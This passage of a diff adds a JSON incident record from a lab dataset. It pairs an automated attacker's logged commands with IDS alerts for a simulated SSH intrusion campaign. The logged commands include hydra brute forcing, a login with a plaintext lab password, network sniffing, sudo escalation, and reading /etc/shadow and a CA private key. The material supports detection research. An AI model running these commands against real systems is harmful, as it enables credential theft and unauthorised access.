@@ -1,0 +1,2552 @@
+{
+  "incident_id": "INC-2025-CAM-LDS-001",
+  "title": "CAM-LDS APT Attack Campaign (SSH Intrusion to Ransomware)",
+  "dataset_source": "Zenodo CAM-LDS Cybersecurity Dataset (Sequence 3_ssh_apt)",
+  "description": "Multi-stage APT attack scenario spanning SSH Brute Force, Privilege Escalation, Shared Library Injection, Cron Persistence, Lateral Movement, and Ransomware Execution.",
+  "target_environment": "Corporate Linux Server Infrastructure",
+  "raw_events_count": 44,
+  "events": [
+    {
+      "raw_id": "EVT-1001",
+      "seq": "3_ssh_apt-1",
+      "timestamp": "2025-12-12T10:28:22.693190",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-1/attacker/logs/attackmate.json",
+      "command": "hydra -C user_pass_combo.txt -s 10022 fw.attackbed.com ssh",
+      "tactics": "Initial Access",
+      "techniques": "T1078.002,T1110.001,T1133",
+      "technique_name": "Valid Accounts: Local Accounts, Brute Force: Password Guessing, External Remote Services",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:28:22.693190",
+        "type": "shell",
+        "cmd": "hydra -C user_pass_combo.txt -s 10022 fw.attackbed.com ssh",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1078.002,T1110.001,T1133",
+            "tactics": "Initial Access",
+            "technique_name": "Valid Accounts: Local Accounts, Brute Force: Password Guessing, External Remote Services"
+          },
+          "interactive": false,
+          "creates_session": null,
+          "session": null,
+          "command_timeout": "10",
+          "read": true,
+          "command_shell": "/bin/sh",
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1002",
+      "seq": "3_ssh_apt-1",
+      "timestamp": "2025-12-12T10:28:23.483+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-1/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - ET SCAN Potential SSH Scan",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:28:23.483+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - ET SCAN Potential SSH Scan",
+          "id": "86601",
+          "firedtimes": 24,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765535303.983414",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:28:22.333334+0000",
+          "flow_id": "2196802460063254.000000",
+          "in_iface": "ens5",
+          "event_type": "alert",
+          "src_ip": "192.42.1.174",
+          "src_port": "40716",
+          "dest_ip": "172.17.100.122",
+          "dest_port": "22",
+          "proto": "TCP",
+          "community_id": "1:iljzhUQ+5qFtWyUkr0Rc7VFidAs=",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2001219",
+            "rev": "20",
+            "signature": "ET SCAN Potential SSH Scan",
+            "category": "Attempted Information Leak",
+            "severity": "2",
+            "metadata": {
+              "confidence": [
+                "Medium"
+              ],
+              "created_at": [
+                "2010_07_30"
+              ],
+              "signature_severity": [
+                "Informational"
+              ],
+              "updated_at": [
+                "2019_07_26"
+              ]
+            }
+          },
+          "flow": {
+            "pkts_toserver": "1",
+            "pkts_toclient": "0",
+            "bytes_toserver": "74",
+            "bytes_toclient": "0",
+            "start": "2025-12-12T10:28:22.333334+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1003",
+      "seq": "3_ssh_apt-1",
+      "timestamp": "2025-12-12T10:28:23.483+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-1/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - SURICATA Applayer Detect protocol only one direction",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:28:23.483+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - SURICATA Applayer Detect protocol only one direction",
+          "id": "86601",
+          "firedtimes": 25,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765535303.985005",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:28:22.348756+0000",
+          "flow_id": "1253962649312819.000000",
+          "in_iface": "ens5",
+          "event_type": "alert",
+          "src_ip": "172.17.100.122",
+          "src_port": "22",
+          "dest_ip": "192.42.1.174",
+          "dest_port": "40768",
+          "proto": "TCP",
+          "metadata": {
+            "flowints": {
+              "applayer": {
+                "anomaly": {
+                  "count": "1"
+                }
+              }
+            }
+          },
+          "community_id": "1:eV4vWKbGSDwWy4V5DWspqM54slU=",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2260002",
+            "rev": "1",
+            "signature": "SURICATA Applayer Detect protocol only one direction",
+            "category": "Generic Protocol Command Decode",
+            "severity": "3"
+          },
+          "ssh": {
+            "client": {
+              "proto_version": "2.0",
+              "software_version": "libssh_0.10.6"
+            }
+          },
+          "app_proto": "ssh",
+          "flow": {
+            "pkts_toserver": "3",
+            "pkts_toclient": "4",
+            "bytes_toserver": "229",
+            "bytes_toclient": "294",
+            "start": "2025-12-12T10:28:22.335411+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1004",
+      "seq": "3_ssh_apt-1",
+      "timestamp": "2025-12-12T10:28:25.489+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-1/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - SURICATA Applayer Detect protocol only one direction",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:28:25.489+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - SURICATA Applayer Detect protocol only one direction",
+          "id": "86601",
+          "firedtimes": 26,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765535305.987495",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:28:24.848376+0000",
+          "flow_id": "1150707340734055.000000",
+          "in_iface": "ens5",
+          "event_type": "alert",
+          "src_ip": "172.17.100.122",
+          "src_port": "22",
+          "dest_ip": "192.42.1.174",
+          "dest_port": "40798",
+          "proto": "TCP",
+          "metadata": {
+            "flowints": {
+              "applayer": {
+                "anomaly": {
+                  "count": "1"
+                }
+              }
+            }
+          },
+          "community_id": "1:sci55w0cYItYnZ/Eob0f/kmhx9c=",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2260002",
+            "rev": "1",
+            "signature": "SURICATA Applayer Detect protocol only one direction",
+            "category": "Generic Protocol Command Decode",
+            "severity": "3"
+          },
+          "ssh": {
+            "client": {
+              "proto_version": "2.0",
+              "software_version": "libssh_0.10.6"
+            }
+          },
+          "app_proto": "ssh",
+          "flow": {
+            "pkts_toserver": "3",
+            "pkts_toclient": "4",
+            "bytes_toserver": "229",
+            "bytes_toclient": "294",
+            "start": "2025-12-12T10:28:24.847463+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1005",
+      "seq": "3_ssh_apt-1_2",
+      "timestamp": "2025-12-12T10:28:43.802248",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-1_2/attacker/logs/attackmate.json",
+      "command": "id",
+      "tactics": "Initial Access",
+      "techniques": "T1078.002",
+      "technique_name": "Valid Accounts: Local Accounts",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:28:43.802248",
+        "type": "ssh",
+        "cmd": "id",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1078.002",
+            "tactics": "Initial Access",
+            "technique_name": "Valid Accounts: Local Accounts"
+          },
+          "hostname": "fw.attackbed.com",
+          "port": "10022",
+          "username": "john",
+          "password": "rambo",
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": "foothold",
+          "session": null,
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": false,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1006",
+      "seq": "3_ssh_apt-3",
+      "timestamp": "2025-12-12T10:28:59.926744",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-3/attacker/logs/attackmate.json",
+      "command": "tcpdump -A port 21\n",
+      "tactics": "Credential Access",
+      "techniques": "T1040",
+      "technique_name": "Network Sniffing",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:28:59.926744",
+        "type": "ssh",
+        "cmd": "tcpdump -A port 21\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1040",
+            "tactics": "Credential Access",
+            "technique_name": "Network Sniffing"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1008",
+      "seq": "3_ssh_apt-4_5",
+      "timestamp": "2025-12-12T10:29:50.037143",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-4_5/attacker/logs/attackmate.json",
+      "command": "sudo -i\n",
+      "tactics": "Privilege Escalation",
+      "techniques": "T1078.003",
+      "technique_name": "Valid Accounts: Local Accounts",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:29:50.037143",
+        "type": "ssh",
+        "cmd": "sudo -i\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1078.003",
+            "tactics": "Privilege Escalation",
+            "technique_name": "Valid Accounts: Local Accounts"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1009",
+      "seq": "3_ssh_apt-4_5",
+      "timestamp": "2025-12-12T10:30:05.044203",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-4_5/attacker/logs/attackmate.json",
+      "command": "rambo\n",
+      "tactics": "Privilege Escalation",
+      "techniques": "T1078.003",
+      "technique_name": "Valid Accounts: Local Accounts",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:30:05.044203",
+        "type": "ssh",
+        "cmd": "rambo\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1078.003",
+            "tactics": "Privilege Escalation",
+            "technique_name": "Valid Accounts: Local Accounts"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1010",
+      "seq": "3_ssh_apt-6",
+      "timestamp": "2025-12-12T10:30:35.052241",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-6/attacker/logs/attackmate.json",
+      "command": "cat /etc/shadow\n",
+      "tactics": "Credential Access",
+      "techniques": "T1003.008",
+      "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:30:35.052241",
+        "type": "ssh",
+        "cmd": "cat /etc/shadow\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1003.008",
+            "tactics": "Credential Access",
+            "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1011",
+      "seq": "3_ssh_apt-7",
+      "timestamp": "2025-12-12T10:30:50.058127",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-7/attacker/logs/attackmate.json",
+      "command": "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n",
+      "tactics": "Collection",
+      "techniques": "T1213",
+      "technique_name": "Data from Information Repositories",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:30:50.058127",
+        "type": "ssh",
+        "cmd": "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1213",
+            "tactics": "Collection",
+            "technique_name": "Data from Information Repositories"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1012",
+      "seq": "3_ssh_apt-8",
+      "timestamp": "2025-12-12T10:31:05.062878",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-8/attacker/logs/attackmate.json",
+      "command": "cat /media/share/healthcheck_cron.sh\n",
+      "tactics": "Collection",
+      "techniques": "T1039",
+      "technique_name": "Data from Network Shared Drive",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:31:05.062878",
+        "type": "ssh",
+        "cmd": "cat /media/share/healthcheck_cron.sh\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1039",
+            "tactics": "Collection",
+            "technique_name": "Data from Network Shared Drive"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1013",
+      "seq": "3_ssh_apt-9",
+      "timestamp": "2025-12-12T10:32:30.613553",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-9/attacker/logs/attackmate.json",
+      "command": "ls -l /var/www/html/debian\n",
+      "tactics": "Discovery",
+      "techniques": "T1083",
+      "technique_name": "File and Directory Discovery",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:32:30.613553",
+        "type": "ssh",
+        "cmd": "ls -l /var/www/html/debian\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1083",
+            "tactics": "Discovery",
+            "technique_name": "File and Directory Discovery"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1014",
+      "seq": "3_ssh_apt-10",
+      "timestamp": "2025-12-12T10:32:45.621796",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-10/attacker/logs/attackmate.json",
+      "command": "apt update && apt install -y dpkg-dev\n",
+      "tactics": "Execution",
+      "techniques": "T1059.004",
+      "technique_name": "Command and Scripting Interpreter: Unix Shell",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:32:45.621796",
+        "type": "ssh",
+        "cmd": "apt update && apt install -y dpkg-dev\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1059.004",
+            "tactics": "Execution",
+            "technique_name": "Command and Scripting Interpreter: Unix Shell"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1016",
+      "seq": "3_ssh_apt-10",
+      "timestamp": "2025-12-12T10:32:45.741+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:32:45.741+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+          "id": "86601",
+          "firedtimes": 34,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765535565.1001713",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:32:45.047443+0000",
+          "flow_id": "1149766759884070.000000",
+          "in_iface": "ens5",
+          "event_type": "alert",
+          "src_ip": "172.17.100.122",
+          "src_port": "48512",
+          "dest_ip": "185.125.190.95",
+          "dest_port": "80",
+          "proto": "TCP",
+          "community_id": "1:gguYXA+qRGswY0AVnaL1jIgGxPQ=",
+          "tx_id": "0",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2013504",
+            "rev": "6",
+            "signature": "ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+            "category": "Not Suspicious Traffic",
+            "severity": "3",
+            "metadata": {
+              "confidence": [
+                "High"
+              ],
+              "created_at": [
+                "2011_08_31"
+              ],
+              "signature_severity": [
+                "Informational"
+              ],
+              "updated_at": [
+                "2020_04_22"
+              ]
+            }
+          },
+          "http": {
+            "hostname": "nova.clouds.archive.ubuntu.com",
+            "url": "/ubuntu/dists/jammy/InRelease",
+            "http_user_agent": "Debian APT-HTTP/1.3 (2.4.12) non-interactive",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": "304",
+            "length": "0"
+          },
+          "app_proto": "http",
+          "flow": {
+            "pkts_toserver": "4",
+            "pkts_toclient": "2",
+            "bytes_toserver": "506",
+            "bytes_toclient": "615",
+            "start": "2025-12-12T10:32:44.992550+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1017",
+      "seq": "3_ssh_apt-10",
+      "timestamp": "2025-12-12T10:32:45.746+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:32:45.746+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+          "id": "86601",
+          "firedtimes": 35,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765535565.1003974",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:32:45.073319+0000",
+          "flow_id": "1149766759884070.000000",
+          "in_iface": "ens5",
+          "event_type": "alert",
+          "src_ip": "172.17.100.122",
+          "src_port": "48512",
+          "dest_ip": "185.125.190.95",
+          "dest_port": "80",
+          "proto": "TCP",
+          "community_id": "1:gguYXA+qRGswY0AVnaL1jIgGxPQ=",
+          "tx_id": "1",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2013504",
+            "rev": "6",
+            "signature": "ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+            "category": "Not Suspicious Traffic",
+            "severity": "3",
+            "metadata": {
+              "confidence": [
+                "High"
+              ],
+              "created_at": [
+                "2011_08_31"
+              ],
+              "signature_severity": [
+                "Informational"
+              ],
+              "updated_at": [
+                "2020_04_22"
+              ]
+            }
+          },
+          "http": {
+            "hostname": "nova.clouds.archive.ubuntu.com",
+            "url": "/ubuntu/dists/jammy-updates/InRelease",
+            "http_user_agent": "Debian APT-HTTP/1.3 (2.4.12) non-interactive",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": "304",
+            "length": "0"
+          },
+          "app_proto": "http",
+          "flow": {
+            "pkts_toserver": "6",
+            "pkts_toclient": "3",
+            "bytes_toserver": "1124",
+            "bytes_toclient": "1156",
+            "start": "2025-12-12T10:32:44.992550+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1018",
+      "seq": "3_ssh_apt-10",
+      "timestamp": "2025-12-12T10:32:47.692+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:32:47.692+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+          "id": "86601",
+          "firedtimes": 36,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765535567.1007132",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:32:45.215771+0000",
+          "flow_id": "998141529492673.000000",
+          "in_iface": "ens5",
+          "event_type": "alert",
+          "src_ip": "172.17.100.122",
+          "src_port": "54408",
+          "dest_ip": "18.239.255.42",
+          "dest_port": "80",
+          "proto": "TCP",
+          "community_id": "1:U8amG/LMg7FEKAGgN+KIBr6rnvA=",
+          "tx_id": "0",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2013504",
+            "rev": "6",
+            "signature": "ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+            "category": "Not Suspicious Traffic",
+            "severity": "3",
+            "metadata": {
+              "confidence": [
+                "High"
+              ],
+              "created_at": [
+                "2011_08_31"
+              ],
+              "signature_severity": [
+                "Informational"
+              ],
+              "updated_at": [
+                "2020_04_22"
+              ]
+            }
+          },
+          "http": {
+            "hostname": "apt.puppet.com",
+            "url": "/dists/jammy/InRelease",
+            "http_user_agent": "Debian APT-HTTP/1.3 (2.4.12) non-interactive",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": "304",
+            "length": "0"
+          },
+          "app_proto": "http",
+          "flow": {
+            "pkts_toserver": "4",
+            "pkts_toclient": "3",
+            "bytes_toserver": "483",
+            "bytes_toclient": "1503",
+            "start": "2025-12-12T10:32:45.003265+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1019",
+      "seq": "3_ssh_apt-10",
+      "timestamp": "2025-12-12T10:32:47.696+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:32:47.696+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+          "id": "86601",
+          "firedtimes": 37,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765535567.1009341",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:32:45.374713+0000",
+          "flow_id": "1149766759884070.000000",
+          "in_iface": "ens5",
+          "event_type": "alert",
+          "src_ip": "172.17.100.122",
+          "src_port": "48512",
+          "dest_ip": "185.125.190.95",
+          "dest_port": "80",
+          "proto": "TCP",
+          "community_id": "1:gguYXA+qRGswY0AVnaL1jIgGxPQ=",
+          "tx_id": "2",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2013504",
+            "rev": "6",
+            "signature": "ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+            "category": "Not Suspicious Traffic",
+            "severity": "3",
+            "metadata": {
+              "confidence": [
+                "High"
+              ],
+              "created_at": [
+                "2011_08_31"
+              ],
+              "signature_severity": [
+                "Informational"
+              ],
+              "updated_at": [
+                "2020_04_22"
+              ]
+            }
+          },
+          "http": {
+            "hostname": "nova.clouds.archive.ubuntu.com",
+            "url": "/ubuntu/dists/jammy-backports/InRelease",
+            "http_user_agent": "Debian APT-HTTP/1.3 (2.4.12) non-interactive",
+            "http_method": "GET",
